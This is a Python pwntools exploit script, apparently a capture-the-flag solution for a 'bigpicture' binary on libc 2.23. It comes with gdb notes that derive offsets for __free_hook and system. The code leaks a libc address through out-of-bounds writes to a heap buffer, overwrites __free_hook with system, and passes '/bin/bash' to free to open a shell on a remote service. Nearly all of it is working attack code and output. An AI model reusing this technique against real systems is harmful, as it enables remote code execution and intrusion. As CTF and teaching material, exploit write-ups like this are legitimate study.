from pwn import *
import sys
import math

'''
This is a sample of the difference between the base of the mmap'd buffer
and the load address of the executable block of libc. The actual 0, 0 point
is at base + 0x10 though so keep that in mind.
>>> hex(0x7ff86574f000-0x7ff86525b000)
'0x4f4000'
'''

'''
ubuntu@ubuntu-xenial:/vagrant$ LD_PRELOAD=./libc-2.23.so ./bigpicture_p
Let's draw a picture!
How big? 1000 x 1000
> 0 , 0 , p
> 0 , 1 , w
> quit
Bye!

Looking at free() in libc-2.23.so I found this:
=> 0x7ff8652de940 <free>:    push   %r13
   0x7ff8652de942 <free+2>:    push   %r12
   0x7ff8652de944 <free+4>:    push   %rbp
   0x7ff8652de945 <free+5>:    push   %rbx
   0x7ff8652de946 <free+6>:    sub    $0x28,%rsp
   0x7ff8652de94a <free+10>:    mov    0x33f5a7(%rip),%rax        # 0x7ff86561def8
   0x7ff8652de951 <free+17>:    mov    (%rax),%rax
   0x7ff8652de954 <free+20>:    test   %rax,%rax
   0x7ff8652de957 <free+23>:    jne    0x7ff8652dea30 <free+240>

(gdb) x /10i 0x7ff8652dea30
   0x7ff8652dea30 <free+240>:    mov    0x48(%rsp),%rsi
   0x7ff8652dea35 <free+245>:    callq  *%rax    # This part is insteresting

=> 0x7ff8652de951 <free+17>:    mov    (%rax),%rax    ## So if __free_hook is non-null it is called
(gdb) x /x $rax
0x7ff8656207a8 <__free_hook>:    0x00000000

(gdb) x /s $rdi
0x7ff86574f010: "pw"        ## And it will point to the start of my buffer.

__free_hook is at offset:
>>> hex(0x7ff8656207a8-0x7ff86525b000)
'0x3c57a8'

in libc

So total offset is: 0x12e868 from the start of the mmap'd buffer

system is at:
(gdb) info addr system
Symbol "system" is at 0x7fe739442390 in a file compiled without debugging.

diff to malloc picture
>>> hex(0x7fe76565b010-0x7fe765529e48)
'0x1311c8'
use this for the leak
>>>

'''

def index_to_coord_string( index, val ):
    x = index / 1000
    y = index % 1000

    d = '%d , %d, %c' %(x,y,val)

    return d

def get_leak( s ):

    ## index to malloc leak
    base = -1249736
    z = ''

    for i in range(6):
        l = index_to_coord_string( base + i, 'A')
        s.send(l + '\n')

        y = s.readuntil('> ')

        if y.startswith('over') == False:
            z += '\x00'
        else:
            z += y[12]

    z += '\x00\x00'
    return u64(z)

def write_data( s, data, index):
    while len(data):
        l = index_to_coord_string( index, data[0] )
        s.send( l + '\n')

        s.readuntil('> ')
        data = data[1:]
        index += 1

s = remote(sys.argv[1], int(sys.argv[2]))

print s.recvuntil('big? ')
s.send('1000 x 1000\n')
print s.recvuntil('> ')

y = get_leak(s)
libc_base = y - 0x83580
system = libc_base + 0x45390

print 'libc base: %s' %(hex(libc_base))

## overwrite __free_hook
write_data( s, p64(system), -1239144)

## write /bin/bash which will become the argument to system
write_data( s, "/bin/bash", 0)

s.send('quit\n')
s.interactive()